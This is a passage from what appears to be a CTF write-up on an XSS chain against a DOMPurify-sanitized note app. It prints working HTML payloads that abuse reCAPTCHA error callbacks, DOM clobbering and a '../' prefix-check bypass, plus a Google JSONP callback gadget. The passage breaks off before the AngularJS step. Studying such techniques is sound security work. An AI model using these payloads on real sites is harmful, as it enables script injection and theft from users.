@@ -1,0 +1,233 @@
+function sanitize(html, options = defaultOptions) {
+  return DOMPurify.sanitize(html, {
+    FORBID_TAGS: options.blockTags || [],
+    FORBID_ATTR: options.blockAttrs || [],
+    FORCE_BODY: options.forceBody,
+    WHOLE_DOCUMENT: options.wholeDocument,
+    KEEP_CONTENT: !options.removeContent,
+    SANITIZE_DOM: !options.allowDOM,
+  })
+}
+
+function loadData(sanitizeOptions) {
+  const params = (new URL(document.location)).searchParams
+  const name = params.get('name')
+  const content = params.get('content')
+
+  if (!content) return
+
+  // hide some elements, we don't need it
+  document.querySelector('.title').innerText = 'Note'
+  document.querySelector('.input-type').style = 'display: none';
+  document.querySelector('.input-date').style = 'display: none';
+  document.querySelector('.input-mode').style = 'display: none';
+  document.querySelector('#input-content').style = 'display: none';
+  document.querySelector('#submit').style = 'display: none';
+  document.querySelector('#clear').style = 'display: none';
+  document.querySelector('#reload').style = "display:none"
+
+  document.querySelector('input[name=creator]').value = name
+  const result = sanitize(content, sanitizeOptions)
+  renderer.style = "width:100%; min-height: 400px;display: block"
+  renderer.innerHTML = result
+}
+
+loadData({
+  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
+  blockAttrs: [],
+  forceBody: false,
+  wholeDocument: false,
+  allowDOM: false,
+  removeContent: true
+})
+```
+
+When the app is loaded, in `loadData` function, it reads data from the URL and then renders it to `innerHTML` after sanitized, that's all.
+
+For sanitizing, the config is pretty much the default one, so you can't perform XSS directly unless you find a 0-day bypass:
+
+``` js
+function sanitize(html, options = defaultOptions) {
+  return DOMPurify.sanitize(html, {
+    FORBID_TAGS: options.blockTags || [],
+    FORBID_ATTR: options.blockAttrs || [],
+    FORCE_BODY: options.forceBody,
+    WHOLE_DOCUMENT: options.wholeDocument,
+    KEEP_CONTENT: !options.removeContent,
+    SANITIZE_DOM: !options.allowDOM,
+  })
+}
+
+loadData({
+  blockTags: ['style', 'iframe', 'embed', 'input', 'svg', 'script', 'math', 'base', 'link'],
+  blockAttrs: [],
+  forceBody: false,
+  wholeDocument: false,
+  allowDOM: false,
+  removeContent: true
+})
+```
+
+What can we do by injecting a harmless HTML? Not much, unless you leverage another functionality.
+
+### reCAPTCHA to the rescue
+
+Somehow, the challenge uses Google reCAPTCHA, and from their [docs](https://developers.google.com/recaptcha/docs/invisible#render_param) we know that we can trigger a function call by injecting the following HTML:
+
+``` html
+<div
+  class="g-recaptcha"
+  data-sitekey="AAA"
+  data-error-callback="any_function_here"
+  data-size="invisible">
+</div>
+```
+
+By providing a random wrong sitekey, reCAPTCHA will call the function in the attribute `data-error-callback`.
+
+It's important that DOMPurify allows any attributes that start with `data-` by default, and also both `class` and `id` are permitted.
+
+I learned this nifty trick from TSJ CTF 2022 - web/Nim Notes, but it seems that it's from [another XSS challenge](https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue) made by @terjanq in TokyoWesterns CTF 2020.
+
+Now, we can call a function by injecting HTML. The question is, what function should we call?
+
+Both `loadScript` and `reloadRecaptchaScript` are suspicious, but `loadScript` might not be a good target because we can't control the arguments.
+
+How about `reloadRecaptchaScript`?
+
+``` js
+function reloadRecaptchaScript(index) {
+  // delay for a bit to not block main thread
+  setTimeout(() => {
+    console.log('reload', index, document.scripts[index])
+    const element = document.scripts[index]
+    const src = element.getAttribute('src')
+    if (!src.startsWith('https://www.google.com/recaptcha/')) {
+      throw new Error('reload failed, invalid src')
+    }
+    element.parentNode.removeChild(element)
+    loadScript(src)
+  }, 1000)
+}
+```
+
+If we can control `document.scripts[index]`, we can load another script from `https://www.google.com`.
+
+When the reCAPTCHA calls a function, it passes no argument, so the `index` will be `undefined`, so we need to override `document.scripts['undefined']`
+
+Can we control it? Sure, it's DOM clobbering time!
+
+### DOM clobbering
+
+Usually, we can override the attribute on document by providing a `embed`, `form`, `input`, `object` or `img` with `name`, like this:
+
+``` html
+<img name="scripts">
+// document.scripts => <img>
+```
+
+Combining with `form` element, we can clobber `document.scripts['undefined']`:
+
+``` html
+<form name="scripts">
+  <img name="undefined" src="src">
+</form>
+```
+
+But, it's not working because DOMPurify prevents this behavior by default: https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015
+
+``` js
+if (
+  SANITIZE_DOM &&
+  (lcName === 'id' || lcName === 'name') &&
+  (value in document || value in formElement)
+) {
+  return false;
+}
+```
+
+Fortunately, there is another vulnerability in the code:
+
+``` js
+function sanitize(html, options = defaultOptions) {
+  return DOMPurify.sanitize(html, {
+    FORBID_TAGS: options.blockTags || [],
+    FORBID_ATTR: options.blockAttrs || [],
+    FORCE_BODY: options.forceBody,
+    WHOLE_DOCUMENT: options.wholeDocument,
+    KEEP_CONTENT: !options.removeContent,
+    SANITIZE_DOM: !options.allowDOM,
+  })
+}
+```
+
+When calling `sanitize` without `options`, the default value will be `defaultOptions`, so we can clobber `defaultOptions.allowDOM` to make `SANITIZE_DOM` falsy.
+
+Also, we need to call `loadData()` again without any arguments to let `sanitizeOptions` be `undefined`.
+
+To sum up, we can control `document.scripts['undefined']` by providing below HTML:
+
+``` html
+<div>
+  <form></form>
+  <form name="scripts">
+    <img name="undefined" src="src_here">
+  </form>
+  <form id=defaultOptions>
+    <img name=allowDOM>
+  </form>
+  <div class="g-recaptcha"
+    data-sitekey="AAA"
+    data-error-callback="reloadRecaptchaScript"
+    data-size="invisible">
+  </div>
+  <div class="g-recaptcha"
+    data-sitekey="BBB"
+    data-error-callback="loadData"
+    data-size="invisible">
+  </div>
+</div>
+```
+
+### Load external script
+
+Now, we have control on `document.scripts[index]`, but we still need to bypass another check:
+
+``` js
+function reloadRecaptchaScript(index) {
+  setTimeout(() => {
+    console.log('reload', index, document.scripts[index])
+    const element = document.scripts[index]
+    const src = element.getAttribute('src')
+    if (!src.startsWith('https://www.google.com/recaptcha/')) {
+      throw new Error('reload failed, invalid src')
+    }
+    element.parentNode.removeChild(element)
+    loadScript(src)
+  }, 1000)
+}
+```
+
+The `src` should start with `https://www.google.com/recaptcha/`, how to overcome this?
+
+There is a subtle difference between `element.src` and `element.getAttribute('src')`, the former returns the formatted value, while the latter returns raw value:
+
+``` html
+<img src="https://example.com/abc/../test">
+// img.src => https://example.com/test
+// img.getAttribute('src') => https://example.com/abc/../test
+```
+
+By using `../`, we can load any scripts from `https://www.google.com`.
+
+It's easy to find a useful gadget from [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt#L2): `https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1`
+
+The response is like:
+
+``` js
+alert && alert(["hello",["hello kitty","hello world","hello kiki","hellolulu","hello venus","hello nico","hello bubble"],["","","","","","","",""],[],{"google:clientdata":{"bpc":false,"phi":0,"tlw":false},"google:suggestrelevance":[601,600,555,554,553,552,551,550],"google:suggestsubtypes":[[512,433],[512,433,131],[512,433,131],[512],[512,433],[512],[512],[512,433,131]],"google:suggesttype":["QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY","QUERY"],"google:verbatimrelevance":1300}])
+```
+
+We can't run arbitrary JS because `callback` is restricted, it won't work if you pass something like `alert(document.domain)`, but we have the ability to call a function with controlled arguments.
+
+The idea is simple, we can use it to load AngularJS from cdn.js by leverage the classic `..%2f` trick.
